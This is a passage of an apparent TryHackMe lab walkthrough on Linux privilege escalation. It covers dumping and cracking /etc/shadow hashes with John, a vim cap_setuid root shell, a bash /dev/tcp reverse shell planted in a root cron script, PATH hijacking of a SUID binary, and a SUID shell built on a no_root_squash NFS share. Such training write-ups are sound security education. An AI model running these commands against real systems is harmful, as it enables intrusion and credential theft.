uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18796::::::
ubuntu:!:18796:0:99999:7:::
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::
$ 
```

We also save a local copy of this file as `shadow.txt` and unshadow it together with our previous file.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─$ vi shadow.txt 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─$ unshadow passwd.txt shadow.txt > unshadow.txt  

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─$ cat unshadow.txt                                                              
root:*:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/usr/sbin/nologin
man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:*:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:*:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:*:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:*:103:106::/nonexistent:/usr/sbin/nologin
syslog:*:104:110::/home/syslog:/usr/sbin/nologin
_apt:*:105:65534::/nonexistent:/usr/sbin/nologin
tss:*:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:*:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:*:108:113::/nonexistent:/usr/sbin/nologin
sshd:*:109:65534::/run/sshd:/usr/sbin/nologin
landscape:*:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:*:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:!:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:!!:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:!:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:1001:1001::/home/gerryconway:/bin/sh
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:1002:1002::/home/user2:/bin/sh
lxd:!:998:100::/var/snap/lxd/common/lxd:/bin/false
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:1003:1003::/home/karen:/bin/sh
```

Next, we try to crack the passwords with John and the rockyou wordlist.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt 
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (karen)     
Password1        (user2)     
test123          (gerryconway)     
3g 0:00:00:08 DONE (2025-12-18 10:46) 0.3750g/s 2240p/s 3136c/s 3136C/s paramedic..biscuit1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Answer: `Password1`

#### What is the content of the flag3.txt file?

We reuse the `base64`-trick to read the flag:

```bash
$ find / -name flag3.txt -ls 2>/dev/null
   256346      4 -rwx------   1 root     root           12 Jun 18  2021 /home/ubuntu/flag3.txt
$ base64 /home/ubuntu/flag3.txt | base64 -d
THM-<REDACTED>
$ 
```

Answer: `THM-<REDACTED>`

### Task 8: Privilege Escalation: Capabilities

**Note**: Launch the target machine attached to this task to follow along. You can launch the target machine and access it directly from your browser.

Alternatively, you can access it over SSH with the low-privilege user credentials below:

- **Username**: karen
- **Password**: Password1

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.

The capabilities man page provides detailed information on its usage and options.

We can use the `getcap` tool to list enabled capabilities.

![Getcap Example](Images/Getcap_Example.png)

When run as an unprivileged user, `getcap -r /` will generate a huge amount of errors, so it is good practice to redirect the error messages to `/dev/null`.

Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.

![Vim No SUID](Images/Vim_No_SUID.png)

[GTFObins](https://gtfobins.github.io/) has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

We notice that vim can be used with the following command and payload:

![Vim Exploiting Capabilities](Images/Vim_Exploiting_Capabilities.png)

This will launch a root shell as seen below;

![Vim Exploiting Capabilities 2](Images/Vim_Exploiting_Capabilities_2.png)

---------------------------------------------------------------------------------------

#### How many binaries have set capabilities?

```bash
$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
$ getcap -r / 2>/dev/null | wc -l
6
$ 
```

Answer: `6`

#### What other binary can be used through its capabilities?

Answer: `view`

#### What is the content of the flag4.txt file?

Checking for the flag, we found that it is world-readable!?

```bash
$ find / -name flag4.txt -ls 2>/dev/null
   256350      4 -rw-r--r--   1 root     root           12 Jun 18  2021 /home/ubuntu/flag4.txt
$ cat /home/ubuntu/flag4.txt
THM-<REDACTED>
```

The intended solution ought to the following, inspired by `https://gtfobins.github.io/gtfobins/vim/#capabilities`

```bash
$ ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
Erase is control-H (^H).
# cat /home/ubuntu/flag4.txt
THM-<REDACTED>
# exit
$ 
```

Note that **py3** was used instead of just **py** (which is not available on the machine).

Answer: `THM-<REDACTED>`

### Task 9: Privilege Escalation: Cron Jobs

**Note**: Launch the target machine attached to this task to follow along. You can launch the target machine and access it directly from your browser.

Alternatively, you can access it over SSH with the low-privilege user credentials below:

- **Username**: karen
- **Password**: Password1

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.

The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.

Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.

Any user can read the file keeping system-wide cron jobs under `/etc/crontab`.

While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.

![Crontab Example 1](Images/Crontab_Example_1.png)

You can see the `backup.sh` script was configured to run every minute. The content of the file shows a simple script that creates a backup of the prices.xls file.

![Crontab Script 1](Images/Crontab_Script_1.png)

As our current user can access this script, we can easily modify it to create a reverse shell, hopefully with root privileges.

The script will use the tools available on the target system to launch a reverse shell.

Two points to note;

1. The command syntax will vary depending on the available tools. (e.g. `nc` will probably not support the `-e` option you may have seen used in other cases)
2. We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.

The file should look like this;

![Crontab Script 2](Images/Crontab_Script_2.png)

We will now run a listener on our attacking machine to receive the incoming connection.

![Crontab Script 3](Images/Crontab_Script_3.png)

Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:

1. System administrators need to run a script at regular intervals.
2. They create a cron job to do this
3. After a while, the script becomes useless, and they delete it
4. They do not clean the relevant cron job

This change management issue leads to a potential exploit leveraging cron jobs.

![Crontab Example 2](Images/Crontab_Example_2.png)

The example above shows a similar situation where the `antivirus.sh` script was deleted, but the cron job still exists.

If the full path of the script is not defined (as it was done for the `backup.sh` script), cron will refer to the paths listed under the `PATH` variable in the `/etc/crontab` file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.

The file on the target system should look familiar:

![Crontab Script 4](Images/Crontab_Script_4.png)

The incoming reverse shell connection has root privileges:

![Crontab Script 5](Images/Crontab_Script_5.png)

In the odd event you find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature.

---------------------------------------------------------------------------------------

#### How many user-defined cron jobs can you see on the target system?

```bash
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py

```

Answer: `4`

#### What is the content of the flag5.txt file?

Checking if these scripts are still present or writeable we find

```bash
$ ls -l /antivirus.sh
ls: cannot access '/antivirus.sh': No such file or directory
$ find -name antivirus.sh 2>/dev/null
$ pwd
/home/karen
$ ls -l backup.sh
-rw-r--r-- 1 karen karen 77 Jun 20  2021 backup.sh
$ ls -l /tmp/test.py
ls: cannot access '/tmp/test.py': No such file or directory
$ 
```

that we can modify our `backup.sh` script. The other scripts do not exist (anymore).

Let's change the `backup.sh` to also run a reverse shell. But first we create a netcat listener to accept the incoming connection.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─$ nc -lvnp 12345
listening on [any] 12345 ...

```

We add a line that create a reverse shell back to our Kali machine and make sure the script is executable.

```bash
$ vi backup.sh
$ cat backup.sh
#!/bin/bash
cd /home/admin/1/2/3/Results
zip -r /home/admin/download.zip ./*

bash -i >& /dev/tcp/192.168.187.183/12345 0>&1
$ ls -l backup.sh
-rw-r--r-- 1 karen karen 125 Dec 18 10:50 backup.sh
$ chmod +x backup.sh
$ 
```

Then we wait a minute or so for the connection.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.187.183] from (UNKNOWN) [10.64.138.82] 47158
bash: cannot set terminal process group (12598): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-64-138-82:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-64-138-82:~# 
```

Now we can get the flag:

```bash
root@ip-10-64-138-82:~# find / -name flag5.txt
find / -name flag5.txt
/home/ubuntu/flag5.txt
root@ip-10-64-138-82:~# cat /home/ubuntu/flag5.txt
cat /home/ubuntu/flag5.txt
THM-<REDACTED>
root@ip-10-64-138-82:~# 
```

Answer: `THM-<REDACTED>`

#### What is Matt's password?

We get the `/etc/shadow` file and create a local copy of it

```bash
root@ip-10-64-138-82:~# cat /etc/shadow
cat /etc/shadow
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18798::::::
ubuntu:!:18798:0:99999:7:::
karen:$6$ZC4srkt5HufYpAAb$GVDM6arO/qQU.o0kLOZfMLAFGNHXULH5bLlidB455aZkKrMvdB1upyMZZzqdZuzlJTuTHTlsKzQAbSZJr9iE21:18798:0:99999:7:::
lxd:!:18798::::::
matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7:::
```

Then we crack it with JtR as before

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow_2.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (matt)     
Password1        (karen)     
2g 0:00:00:01 DONE (2025-12-18 11:59) 1.492g/s 2674p/s 3056c/s 3056C/s adriano..fresa
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Note that we don't need to use `unshadow`.

Answer: `123456`

### Task 10: Privilege Escalation: PATH

**Note**: Launch the target machine attached to this task to follow along. You can launch the target machine and access it directly from your browser.

Alternatively, you can access it over SSH with the low-privilege user credentials below:

- **Username**: karen
- **Password**: Password1

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).

Typically the PATH will look like this:

![PATH Example 1](Images/PATH_Example_1.png)

If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.

1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?

For demo purposes, we will use the script below:

![PATH Example 2](Images/PATH_Example_2.png)

This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.

We compile this into an executable and set the SUID bit. (The `-w` parameter inhibits all warning messages.)

![PATH Example 3](Images/PATH_Example_3.png)

Our user now has access to the “path” script with SUID bit set.

![PATH Example 4](Images/PATH_Example_4.png)

Once executed “path” will look for an executable named “thm” inside folders listed under PATH.

If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege.

A simple search for writable folders can done using the `find / -writable 2>/dev/null` command. The output of this command can be cleaned using a simple cut and sort sequence.

![PATH Example 5](Images/PATH_Example_5.png)

Some CTF scenarios can present different folders but a regular system would output something like we see above.

Comparing this with PATH will help us find folders we could use.

![PATH Example 6](Images/PATH_Example_6.png)

We see a number of folders under `/usr`, thus it could be easier to run our writable folder search once more to cover subfolders.

![PATH Example 7](Images/PATH_Example_7.png)

An alternative could be the command below.

`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`

We have added `grep -v proc` to get rid of the many results related to running processes.

Unfortunately, subfolders under `/usr` are not writable.

The folder that will be easier to write to is probably `/tmp`. At this point because `/tmp` is not present in PATH so we will need to add it. As we can see below, the `export PATH=/tmp:$PATH` command accomplishes this.

![PATH Example 8](Images/PATH_Example_8.png)

At this point the path script will also look under the `/tmp` folder for an executable named “thm”.

Creating this command is fairly easy by copying `/bin/bash` as “thm” under the `/tmp` folder.

![PATH Example 9](Images/PATH_Example_9.png)

We have given executable rights to our copy of `/bin/bash`, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.

![PATH Example 10](Images/PATH_Example_10.png)

---------------------------------------------------------------------------------------

#### What is the odd folder you have write access for?

```bash
$ find / -type d -writable 2>/dev/null
/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service
/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/dbus.socket
/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/init.scope
/sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service
/sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/dbus.socket
/sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/init.scope
/proc/1159/task/1159/fd
/proc/1159/fd
/proc/1159/map_files
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/run/user/1001/systemd/units
/run/screen
/run/cloud-init/tmp
/run/lock
/tmp
/tmp/.X11-unix
/tmp/.Test-unix
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.XIM-unix
/dev/mqueue
/dev/shm
/home/murdoch
/var/tmp
/var/tmp/cloud-init
/var/crash
$ find / -type d -writable 2>/dev/null | grep -E '^/.{4}/.{7}$'
/proc/1179/fd
/home/murdoch
$ 
```

Answer: `/home/murdoch`

#### What is the content of the flag6.txt file?

First we check the location and the permissions of the flag file

```bash
$ find / -name flag6.txt -ls 2>/dev/null
   256348      4 -rwx------   1 ubuntu   ubuntu         14 Jun 20  2021 /home/matt/flag6.txt
```

Next, we check the contents of the `/home/murdoch` directory

```bash
$ ls -la /home/murdoch
total 32
drwxrwxrwx 2 root root  4096 Oct 22  2021 .
drwxr-xr-x 5 root root  4096 Jun 20  2021 ..
-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py
$ file /home/murdoch/*
/home/murdoch/test:   setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1724ca90b94176ea2eb867165e837125e8e5ca52, for GNU/Linux 3.2.0, not stripped
/home/murdoch/thm.py: Python script, ASCII text executable
$ strings /home/murdoch/test
-sh: 14: strings: not found
$ cat /home/murdoch/thm.py
/usr/bin/python3

import os
import sys

try: 
        os.system("thm")
except:
        sys.exit()


$ /home/murdoch/test 
sh: 1: thm: not found
$ 
```

We have a SUID-binary `test` that seems to execute the file `thm.py` which in turn execute the `thm` command.

We create a copy of `/bin/bash` in the `/tmp` directory and add `/tmp` to the PATH

```bash
$ cp /bin/bash /tmp/thm
$ export PATH=/tmp:$PATH
$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
$ 
```

Then we run the `test` binary again to get a root shell

```bash
$ /home/murdoch/test
root@ip-10-66-187-83:/# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
root@ip-10-66-187-83:/# 
```

Finally, we get the flag

```bash
root@ip-10-66-187-83:/# cat /home/matt/flag6.txt
THM-<REDACTED>
```

Answer: `THM-<REDACTED>`

### Task 11: Privilege Escalation: NFS

**Note**: Launch the target machine attached to this task to follow along. You can launch the target machine and access it directly from your browser.

Alternatively, you can access it over SSH with the low-privilege user credentials below:

- **Username**: karen
- **Password**: Password1

Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.

Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.

NFS (Network File System) configuration is kept in the `/etc/exports` file. This file is created during the NFS server installation and can usually be read by users.

![NFS Example 1](Images/NFS_Example_1.png)

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

We will start by enumerating mountable shares from our attacking machine.

![NFS Example 2](Images/NFS_Example_2.png)

We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.

![NFS Example 3](Images/NFS_Example_3.png)

As we can set SUID bits, a simple executable that will run `/bin/bash` on the target system will do the job.

![NFS Example 4](Images/NFS_Example_4.png)

Once we compile the code we will set the SUID bit.

![NFS Example 5](Images/NFS_Example_5.png)

You will see below that both files (`nfs.c` and `nfs` are present on the target system. We have worked on the mounted share so there was no need to transfer them).

![NFS Example 6](Images/NFS_Example_6.png)

Notice the nfs executable has the SUID bit set on the target system and runs with root privileges.

---------------------------------------------------------------------------------------

#### How many mountable shares can you identify on the target system?

```bash
$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)

$ 
```

Answer: `3`

#### How many shares have the "no_root_squash" option enabled?

Answer: `3`

#### Gain a root shell on the target system. What is the content of the flag7.txt file?

First we check for NFS shares on the target.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─$ showmount -e 10.64.137.11                        
Export list for 10.64.137.11:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```

Then we mount the `/tmp`-share - **as root**!

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─$ sudo su                                          
[sudo] password for kali: 
┌──(root㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─# mount -o rw 10.64.137.11:/tmp /mnt/mount_pt                                                           

┌──(root㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─# cd /mnt/mount_pt 

┌──(root㉿kali)-[/mnt/mount_pt]
└─# 
```

Next, we create a SUID-binary on the share

```bash
┌──(root㉿kali)-[/mnt/mount_pt]
└─# vi exec_bash.c

┌──(root㉿kali)-[/mnt/mount_pt]
└─# cat exec_bash.c
#include <stdlib.h>
#include <unistd.h> 

int main() {
        setgid(0);
        setuid(0);
        system("/bin/bash");
        return 0;
}


┌──(root㉿kali)-[/mnt/mount_pt]
└─# gcc exec_bash.c -o exec_bash

┌──(root㉿kali)-[/mnt/mount_pt]
└─# chmod +s exec_bash   

┌──(root㉿kali)-[/mnt/mount_pt]
└─# ls -l exec_bash
-rwsr-sr-x 1 root root 16064 Dec 18 13:45 exec_bash
```

Now we run the SUID-binary on the share

```bash
$ cd /tmp 
$ ls -l exec_bash
-rwsr-sr-x 1 root root 16064 Dec 18 12:45 exec_bash
$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)
$ ./exec_bash
./exec_bash: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exec_bash)
$ ldd --version
ldd (Ubuntu GLIBC 2.31-0ubuntu9.1) 2.31
Copyright (C) 2020 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
```

No joy! That didn't work due to different LIBC-versions.

Let's see if we can fix that.

First we make a local copies of the wanted files (LIBC + LD).

```bash
$ find / -name libc.so* 2>/dev/null
/snap/core/10185/lib/i386-linux-gnu/libc.so.6
/snap/core/10185/lib/x86_64-linux-gnu/libc.so.6
/snap/core18/1885/lib/i386-linux-gnu/libc.so.6
/snap/core18/1885/lib/x86_64-linux-gnu/libc.so.6
/usr/lib/x86_64-linux-gnu/libc.so.6
$ cp /usr/lib/x86_64-linux-gnu/libc.so.6 .
$ cp /lib64/ld-linux-x86-64.so.2 .
```

Back at the NFS-share we try to patch the binary with [pwninit](https://github.com/io12/pwninit)

```bash
┌──(root㉿kali)-[/mnt/mount_pt]
└─# /home/kali/.cargo/bin/pwninit -h        
pwninit 3.3.2
automate starting binary exploit challenges

USAGE:
    pwninit [FLAGS] [OPTIONS]

FLAGS:
    -h, --help            Prints help information
        --no-patch-bin    Disable running patchelf on binary
        --no-template     Disable generating template solve script
    -V, --version         Prints version information

OPTIONS:
        --bin <bin>                                  Binary to pwn
        --ld <ld>                                    A linker to preload the libc
        --libc <libc>                                Challenge libc
        --template-bin-name <template-bin-name>      Name of binary variable for pwntools solve script [default: exe]
        --template-ld-name <template-ld-name>        Name of linker variable for pwntools solve script [default: ld]
        --template-libc-name <template-libc-name>    Name of libc variable for pwntools solve script [default: libc]
        --template-path <template-path>
            Path to custom pwntools solve script template. Check the README for more information

┌──(root㉿kali)-[/mnt/mount_pt]
└─# chown root:root libc.so.6

┌──(root㉿kali)-[/mnt/mount_pt]
└─# chown root:root ld-linux-x86-64.so.2 

┌──(root㉿kali)-[/mnt/mount_pt]
└─# /home/kali/.cargo/bin/pwninit --bin exec_bash --ld ld-linux-x86-64.so.2 --libc libc.so.6 
bin: exec_bash
libc: libc.so.6
ld: ld-linux-x86-64.so.2

unstripping libc
https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.31-0ubuntu9.1_amd64.deb
Found matching file: ./usr/lib/debug/lib/x86_64-linux-gnu/libc-2.31.so
copying exec_bash to exec_bash_patched
running patchelf on exec_bash_patched
writing solve.py stub

┌──(root㉿kali)-[/mnt/mount_pt]
└─# ls -l exec*
-rwsr-sr-x 1 root root 16064 Dec 18 13:45 exec_bash
-rw-rw-r-- 1 root root   115 Dec 18 13:44 exec_bash.c
-rwsr-sr-x 1 root root 20497 Dec 18 14:18 exec_bash_patched
```

We have a patched binary to try.

```bash
$ ./exec_bash_patched
